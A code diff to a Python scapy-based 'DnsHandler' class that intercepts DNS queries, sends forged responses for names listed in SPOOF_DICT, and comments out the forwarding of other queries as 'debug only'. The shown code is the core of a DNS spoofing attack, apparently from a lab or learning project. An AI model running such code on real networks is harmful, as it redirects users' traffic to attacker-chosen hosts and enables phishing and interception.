@@ -129,7 +129,9 @@ class DnsHandler(object):
         transaction_id = pkt[DNS].id  # Transaction ID
         query_name = pkt[DNS].qd.qname  # Query name
 
-        dns_query = IP(dst=NETWORK_DNS_SERVER_IP) / UDP(sport=scapy.RandShort(), dport=53) / DNS(rd=1, id=transaction_id, qd=pkt[DNS].qd)
+        dns_query = IP(dst=NETWORK_DNS_SERVER_IP) / UDP(sport=scapy.RandShort(), dport=53) / DNS(rd=1,
+                                                                                                 id=transaction_id,
+                                                                                                 qd=pkt[DNS].qd)
 
         # TODO: fix this, nothing is returned
         # Send the DNS query to 8.8.8.8 and wait for the response
@@ -200,10 +202,12 @@ class DnsHandler(object):
         if query_name in SPOOF_DICT:
             print("Spoofing DNS response for", query_name)
             response_pkt: scapy.packet.Packet = self.get_spoofed_dns_response(pkt, SPOOF_DICT[query_name])
+            scapy.send(response_pkt)
         else:
-            print("Forwarding DNS request for", query_name, "to", REAL_DNS_SERVER_IP)
-            response_pkt: scapy.packet.Packet = self.get_real_dns_response(pkt)
-        scapy.send(response_pkt)
+            print("[Not really, for debug purposes only] Forwarding DNS request for", query_name, "to",
+                  REAL_DNS_SERVER_IP)
+            # response_pkt: scapy.packet.Packet = self.get_real_dns_response(pkt)
+            # scapy.send(response_pkt)
 
     def run(self) -> None:
         """
